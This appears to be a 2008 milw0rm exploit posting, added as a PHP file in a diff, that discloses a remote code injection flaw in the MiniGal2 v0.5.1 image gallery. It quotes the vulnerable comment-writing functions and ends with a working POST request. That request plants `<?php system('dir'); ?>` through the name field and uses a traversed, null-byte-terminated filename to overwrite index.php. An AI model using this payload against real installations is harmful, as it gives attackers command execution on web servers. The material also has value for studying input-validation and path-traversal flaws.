@@ -1,0 +1,73 @@
+<?php  
+ /**********000000000000----------------------000\\\
+/*-00--------++++++++++++++++++_______________)_)_________
+ -- --
+   -    MiniGal2(MG2) v0.5.1 remote Code Injection    |
+  ___     Z okazji urodzin ¿yczê sobie wszystkiego zajebistego
+                 Zawsze na odwrót lol    '''''_---"
+                    ___)()())0       ------------
+     \                  A-L           |    """"""
+      '--==9**        Victoria  heh      .
+------       gr:SID.PSYCHO ;> and rest and ALL
+       ---------++++++++++++=================))    
+ ___ --             =======--
+            ./..................
+=======--////-
+    VULN:[includes\mg2_functions.php]
+    function writecomments($filename)  __LINE 555
+  ---------
+        function writecomments($filename) {
+	    $filename = "pictures/" . $filename;
+             unset($buffer);
+             if (count($this->comments) != 0) {
+             for ($i=0; $i < count($this->comments); $i++){
+             for ($j=0; $j < count($this->comments[$i]); $j++){
+              $buffer .= "*" . $this->comments[$i][$j];
+             }
+              $buffer .= "\n";
+             $fd = fopen($filename,"w+");
+              if (flock($fd, LOCK_EX)) { // do an exclusive lock
+              ftruncate($fd, 0);
+              fwrite($fd, $buffer);
+              flock($fd, LOCK_UN); // release the lock
+              fclose($fd);
+	        $this->log("Wrote comment to '$filename'");
+              } else {
+	        $this->log("ERROR: Could not lock commentfile '$filename' for writing");
+              echo "MG2 ERROR: Could not lock $filename (function 'writecomments')";
+             }
+            }
+         } else unlink($filename);
+     }
+         /\/\/\/\/\/\/\/\/\/\/\
+
+        function addcomment() {
+        $_REQUEST['filename'] = $this->charfix($_REQUEST['filename']);
+        $_REQUEST['input'] = $this->charfix($_REQUEST['input']);
+        $_REQUEST['email'] = $this->charfix($_REQUEST['email']);
+        $_REQUEST['name'] = $this->charfix($_REQUEST['name']);
+        $_REQUEST['input'] = strip_tags($_REQUEST['input'], "<b></b><i></i><u></u><strong></strong><em></em>");
+        $_REQUEST['input'] = str_replace("\n","<br />",$_REQUEST['input']);
+        $_REQUEST['input'] = str_replace("\r","",$_REQUEST['input']);
+        if ($_REQUEST['input'] != "" && $_REQUEST['name'] != "" && $_REQUEST['email'] != "") {
+         $this->readcomments("pictures/" . $_REQUEST['filename'] . ".comment");
+         $comment_exists = $this->select($_REQUEST['input'],$this->comments,3,1,0);
+         $comment_exists = $this->select($_REQUEST['name'],$comment_exists,1,1,0);
+         $comment_exists = $this->select($_REQUEST['email'],$comment_exists,2,1,0);
+         if (count($comment_exists) == 0) {
+           $this->comments[] = array(time(), $_REQUEST['name'], $_REQUEST['email'], $_REQUEST['input']);
+           $this->writecomments($_REQUEST['filename'] . ".comment");
+         .....etc //
+................-------------------------------------------=====================
+==== As you can se THE  input data is not enough filtered 
+      We can write self code in to the file 
+      by sending proper POSTS 
+      ex:
+      POST input=a&name=/ <?php system('dir'); ?> // &email=c&action=addcomment&filename=../index.php%00&id=5
+      THE END
+     
+-------*/
+// ALFONS LUJA just 4 fUn :P 
+?>
+
+# milw0rm.com [2008-12-08]
